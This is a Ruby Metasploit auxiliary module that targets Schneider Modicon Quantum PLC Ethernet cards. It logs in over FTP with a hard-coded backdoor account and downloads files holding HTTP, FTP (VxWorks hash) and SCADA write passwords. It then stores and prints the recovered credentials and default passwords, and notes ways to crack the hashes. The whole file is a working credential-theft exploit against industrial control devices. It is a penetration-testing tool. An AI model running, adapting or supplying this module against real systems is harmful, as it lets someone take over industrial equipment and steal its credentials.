##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::Ftp
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Schneider Modicon Quantum Password Recovery',
      'Description'    => %q{
        The Schneider Modicon Quantum series of Ethernet cards store usernames and
        passwords for the system in files that may be retrieved via backdoor access.

        This module is based on the original 'modiconpass.rb' Basecamp module from
        DigitalBond.
      },
      'Author'         =>
        [
          'K. Reid Wightman <wightman[at]digitalbond.com>', # original module
          'todb' # Metasploit fixups
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://www.digitalbond.com/tools/basecamp/metasploit-modules/' ]
        ],
      'DisclosureDate'=> 'Jan 19 2012'
      ))

    register_options(
      [
        Opt::RPORT(21),
        OptString.new('FTPUSER', [true, "The backdoor account to use for login", 'ftpuser']),
        OptString.new('FTPPASS', [true, "The backdoor password to use for login", 'password']),
      ], self.class)

    register_advanced_options(
      [
        OptBool.new('RUN_CHECK', [false, "Check if the device is really a Modicon device", true])
      ], self.class)

  end

  # Thinking this should be a standard alias for all aux
  def ip
    Rex::Socket.resolv_to_dotted(datastore['RHOST'])
  end

  def check_banner
    banner == "220 FTP server ready.\r\n"
  end

  # TODO: If the username and password is correct, but this /isn't/ a Modicon
  # device, then we're going to end up storing HTTP credentials that are not
  # correct. If there's a way to fingerprint the device, it should be done here.
  def check
    return true unless datastore['RUN_CHECK']
    is_modicon = false
    vprint_status "#{ip}:#{rport} - FTP - Checking fingerprint"
    connect rescue nil
    if sock
      # It's a weak fingerprint, but it's something
      is_modicon = check_banner()
      disconnect
    else
      print_error "#{ip}:#{rport} - FTP - Cannot connect, skipping"
      return false
    end
    if is_modicon
      print_status "#{ip}:#{rport} - FTP - Matches Modicon fingerprint"
    else
      print_error "#{ip}:#{rport} - FTP - Skipping due to fingerprint mismatch"
    end
    return is_modicon
  end

  def run
    if check()
      if setup_ftp_connection()
        grab()
      end
    end
  end

  def setup_ftp_connection
    vprint_status "#{ip}:#{rport} - FTP - Connecting"
    if connect_login()
      print_status("#{ip}:#{rport} - FTP - Login succeeded")
      report_auth_info(
        :host => ip,
        :port => rport,
        :proto => 'tcp',
        :user => user,
        :pass => pass,
        :ptype => 'password_ro',
        :active => true
      )
      return true
    else
      print_status("#{ip}:#{rport} - FTP - Login failed")
      return false
    end
  end

  def cleanup
    disconnect rescue nil
    data_disconnect rescue nil
  end

  # Echo the Net::FTP implementation
  def ftp_gettextfile(fname)
    vprint_status("#{ip}:#{rport} - FTP - Opening PASV data socket to download #{fname.inspect}")
    data_connect("A")
    res = send_cmd_data(["GET", fname.to_s], nil, "A")
  end

  def grab
    logins = Rex::Ui::Text::Table.new(
      'Header'	=>	"Schneider Modicon Quantum services, usernames, and passwords",
      'Indent'	=>	1,
      'Columns'	=>	["Service", "User Name", "Password"]
    )
    httpcreds = ftp_gettextfile('/FLASH0/userlist.dat')
    if httpcreds
      print_status "#{ip}:#{rport} - FTP - HTTP password retrieval: success"
    else
      print_status "#{ip}:#{rport} - FTP - HTTP default password presumed"
    end
    ftpcreds = ftp_gettextfile('/FLASH0/ftp/ftp.ini')
    if ftpcreds
      print_status "#{ip}:#{rport} - FTP - password retrieval: success"
    else
      print_error "#{ip}:#{rport} - FTP - password retrieval error"
    end
    writecreds = ftp_gettextfile('/FLASH0/rdt/password.rde')
    if writecreds
      print_status "#{ip}:#{rport} - FTP - Write password retrieval: success"
    else
      print_error "#{ip}:#{rport} - FTP - Write password error"
    end
    if httpcreds
      httpuser = httpcreds[1].split(/[\r\n]+/)[0]
      httppass = httpcreds[1].split(/[\r\n]+/)[1]
    else
      # Usual defaults
      httpuser = "USER"
      httppass = "USER"
    end
    print_status("#{rhost}:#{rport} - FTP - Storing HTTP credentials")
    logins << ["http", httpuser, httppass]
    report_auth_info(
      :host	=> ip,
      :port	=> 80,
      :sname	=> "http",
      :user	=> httpuser,
      :pass	=> httppass,
      :active	=> true
    )
    logins << ["scada-write", "", writecreds[1]]
    if writecreds # This is like an enable password, used after HTTP authentication.
      report_note(
        :host => ip,
        :port => 80,
        :proto => 'tcp',
        :sname => 'http',
        :ntype => 'scada.modicon.write-password',
        :data => writecreds[1]
      )
    end

    if ftpcreds
      #  TODO:
      #  Can we add a nicer dictionary?  Revershing the hash
      #  using Metasploit's existing loginDefaultencrypt dictionary yields
      #  plaintexts that contain non-ascii characters for some hashes.
      #  check out entries starting at 10001 in /msf3/data/wordlists/vxworks_collide_20.txt
      #  for examples.  A complete ascii rainbow table for loginDefaultEncrypt is ~2.6mb,
      #  and it can be done in just a few lines of ruby.
      #  See https://github.com/cvonkleist/vxworks_hash
      modicon_ftpuser = ftpcreds[1].split(/[\r\n]+/)[0]
      modicon_ftppass = ftpcreds[1].split(/[\r\n]+/)[1]
    else
      modicon_ftpuser = "USER"
      modicon_ftppass = "USERUSER" #from the manual.  Verified.
    end
    print_status("#{rhost}:#{rport} - FTP - Storing hashed FTP credentials")
    # The collected hash is not directly reusable, so it shouldn't be an
    # auth credential in the Cred sense. TheLightCosine should fix some day.
    # Can be used for telnet as well if telnet is enabled.
      report_note(
        :host => ip,
        :port => rport,
        :proto => 'tcp',
        :sname => 'ftp',
        :ntype => 'scada.modicon.ftp-password',
        :data => "User:#{modicon_ftpuser} VXWorks_Password:#{modicon_ftppass}"
      )
      logins << ["VxWorks", modicon_ftpuser, modicon_ftppass]

    # Not this:
    # report_auth_info(
    #	:host	=> ip,
    #	:port	=> rport,
    #	:proto => 'tcp',
    #	:sname => 'ftp',
    #	:user	=> modicon_ftpuser,
    #	:pass	=> modicon_ftppass,
    #	:type => 'password_vx', # It's a hash, not directly usable, but crackable
    #	:active	=> true
    # )
    print_line logins.to_s
  end

end
